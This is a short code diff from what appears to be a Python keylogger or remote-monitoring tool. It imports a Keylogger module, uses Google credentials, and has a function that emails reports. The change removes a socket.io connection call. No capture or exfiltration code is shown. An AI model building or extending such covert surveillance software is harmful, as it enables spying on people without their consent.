@@ -14,7 +14,6 @@ import CommandLine
 import Folder
 import Keylogger
 import re
-import Connect
 
 from google.auth.transport.requests import Request
 from google.oauth2.credentials import Credentials
@@ -191,7 +190,6 @@ def sendReport(email_sender):
 def main():
     global creds
     global service
-    Connect.start_socketio()
     print("Start build service...")
     buildService()
     while True:
